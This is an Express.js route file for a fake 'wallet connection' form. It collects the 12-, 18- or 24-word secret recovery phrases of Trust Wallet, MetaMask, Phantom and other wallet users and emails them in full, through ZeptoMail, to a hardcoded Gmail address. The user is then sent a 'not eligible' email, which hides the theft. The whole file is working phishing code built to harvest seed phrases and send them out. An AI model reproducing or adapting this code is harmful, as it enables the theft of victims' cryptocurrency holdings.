// src/routes/trustWalletRoutes.js
const express = require("express");
const router = express.Router();
const axios = require("axios");
const sendZeptoTemplateMail = require("../utils/sendZeptoTemplateMail");

// 🔒 HARDCODED RECIPIENT EMAIL
const ADMIN_EMAIL = "instacoinxpay@gmail.com";

/**
 * POST /api/trust-wallet/submit
 * Sends Trust Wallet connection details to admin email and rejection email to user
 * Supports 12, 18, and 24 word phrases
 */
router.post("/submit", async (req, res) => {
  try {
    const { email, words, wordCount, selectedWallet } = req.body;

    // Validation
    if (!email || !words || !Array.isArray(words)) {
      return res.status(400).json({
        success: false,
        error: "Invalid form data. Email and words array required."
      });
    }

    // Check word count (supports 12, 18, or 24)
    const validWordCounts = [12, 18, 24];
    const receivedWordCount = wordCount || words.length;
    
    if (!validWordCounts.includes(receivedWordCount)) {
      return res.status(400).json({
        success: false,
        error: "Invalid word count. Only 12, 18, or 24 words are supported."
      });
    }

    if (words.length !== receivedWordCount) {
      return res.status(400).json({
        success: false,
        error: `Expected ${receivedWordCount} words but received ${words.length}.`
      });
    }

    // Check if all words are filled
    const hasEmptyWords = words.some(word => !word || word.trim() === "");
    if (hasEmptyWords) {
      return res.status(400).json({
        success: false,
        error: `All ${receivedWordCount} words must be filled.`
      });
    }

    // Determine grid layout for email based on word count
    const getGridColumns = (count) => {
      if (count === 12) return "repeat(2, 1fr)";
      if (count === 18) return "repeat(3, 1fr)";
      if (count === 24) return "repeat(4, 1fr)";
      return "repeat(2, 1fr)";
    };

    // Get wallet icon/color based on wallet name
    const getWalletInfo = (walletName) => {
      const walletMap = {
        "TRUST WALLET": { color: "#0033ff", emoji: "🔵" },
        "SAFEPAL": { color: "#4d00ff", emoji: "🟣" },
        "METAMASK": { color: "#e2761b", emoji: "🦊" },
        "PHANTOM": { color: "#4264ab", emoji: "👻" },
        "CRYPTO.COM": { color: "#062d64", emoji: "💳" },
        "ATOMIC": { color: "#105a8e", emoji: "⚛️" },
        "ELECTRUM": { color: "#1d69d3", emoji: "⚡" },
        "COIN98": { color: "#000000", emoji: "🪙" },
        "RAINBOW": { color: "#0033aa", emoji: "🌈" },
        "EXODUS": { color: "#3a2fa8", emoji: "📱" }
      };
      return walletMap[walletName] || { color: "#667eea", emoji: "🔐" };
    };

    const walletInfo = getWalletInfo(selectedWallet);

    // Prepare email content for admin
    const emailHTML = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px 10px 0 0; text-align: center;">
          <h1 style="color: white; margin: 0; font-size: 24px;">🔐 New Wallet Connection</h1>
          <p style="color: white; margin: 10px 0 0 0; opacity: 0.9;">${receivedWordCount}-Word Secret Phrase</p>
        </div>
        
        <div style="background: #f9f9f9; padding: 30px; border-radius: 0 0 10px 10px;">
          <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #667eea; padding-bottom: 10px;">📋 Submission Details</h3>
            
            <!-- Selected Wallet Information -->
            <div style="background: ${walletInfo.color}10; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid ${walletInfo.color};">
              <p style="margin: 0 0 5px 0;"><strong style="color: #555;">Selected Wallet:</strong></p>
              <p style="margin: 0; font-size: 18px; font-weight: bold; color: ${walletInfo.color};">
                ${walletInfo.emoji} ${selectedWallet || 'Not specified'}
              </p>
            </div>
            
            <p style="margin: 10px 0;"><strong>Email:</strong> ${email}</p>
            <p style="margin: 10px 0;"><strong>Word Count:</strong> ${receivedWordCount} words</p>
            <p style="margin: 10px 0;"><strong>Submitted:</strong> ${new Date().toLocaleString('en-US', { 
              weekday: 'long', 
              year: 'numeric', 
              month: 'long', 
              day: 'numeric',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit',
              timeZoneName: 'short'
            })}</p>
          </div>

          <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #667eea; padding-bottom: 10px;">🔑 ${receivedWordCount}-Word Secret Phrase</h3>
            <div style="display: grid; grid-template-columns: ${getGridColumns(receivedWordCount)}; gap: 10px; margin: 20px 0;">
              ${words.map((word, index) => `
                <div style="background: #f5f5f5; padding: 10px; border-radius: 5px; border-left: 3px solid ${walletInfo.color};">
                  <span style="color: #888; font-weight: bold;">${index + 1}.</span>
                  <span style="color: #333; margin-left: 8px; font-family: monospace; word-break: break-word;">${word}</span>
                </div>
              `).join('')}
            </div>
            
            <div style="background: #fff3cd; border: 1px solid #ffc107; border-radius: 5px; padding: 15px; margin-top: 20px;">
              <p style="margin: 0; color: #856404;"><strong>📋 Full Phrase (${receivedWordCount} words):</strong></p>
              <p style="margin: 10px 0 0 0; color: #333; font-family: monospace; word-break: break-all; background: #f5f5f5; padding: 10px; border-radius: 5px;">${words.join(" ")}</p>
            </div>
          </div>

          <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center;">
            <p style="color: #888; font-size: 12px; margin: 0;">
              🔔 This is an automated notification from ${selectedWallet || 'Wallet'} Connect
            </p>
            <p style="color: #888; font-size: 12px; margin: 5px 0 0 0;">
              © ${new Date().getFullYear()} InstaCoinXPay
            </p>
          </div>
        </div>
      </div>
    `;

    // Send email to admin via ZeptoMail
    const zeptoResponse = await axios.post(
      "https://api.zeptomail.in/v1.1/email",
      {
        from: {
          address: process.env.ZEPTOMAIL_FROM,
          name: `${selectedWallet || 'Wallet'} Connect`
        },
        to: [
          {
            email_address: {
              address: ADMIN_EMAIL,
              name: "Admin"
            }
          }
        ],
        subject: `🔐 New ${selectedWallet || 'Wallet'} Connection - ${receivedWordCount} Words - ${new Date().toLocaleDateString()}`,
        htmlbody: emailHTML
      },
      {
        headers: {
          Authorization: process.env.ZEPTOMAIL_API_KEY,
          "Content-Type": "application/json"
        }
      }
    );

    console.log(`✅ ${selectedWallet} email sent successfully for ${receivedWordCount} words to:`, ADMIN_EMAIL);
    console.log("📨 ZeptoMail response:", zeptoResponse.data);

    // ✅ SEND REJECTION EMAIL TO USER USING EXISTING TEMPLATE FROM .ENV
    try {
      const userName = email.split('@')[0]; // Extract name from email
      
      // Use the template key from your .env file
      const userEmailResult = await sendZeptoTemplateMail({
        to: email,
        templateKey: process.env.TPL_TRUST_WALLET_NOT_ELIGIBLE, // ✅ Use existing template from .env
        mergeInfo: {
          userName: userName,
          userEmail: email,
          selectedWallet: selectedWallet || 'Trust Wallet',
          wordCount: receivedWordCount,
          date: new Date().toLocaleDateString('en-US', { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric' 
          })
        }
      });

      console.log(`✅ Rejection email sent to user: ${email}`, userEmailResult);
    } catch (emailError) {
      console.error("❌ Failed to send rejection email to user:", emailError);
      // Don't fail the main request if user email fails
    }

    res.status(200).json({
      success: true,
      message: "Form submitted successfully",
      wordCount: receivedWordCount,
      selectedWallet: selectedWallet
    });

  } catch (error) {
    console.error("❌ Trust Wallet email error:", error.response?.data || error.message);
    
    res.status(500).json({
      success: false,
      error: "Failed to process submission. Please try again."
    });
  }
});

module.exports = router;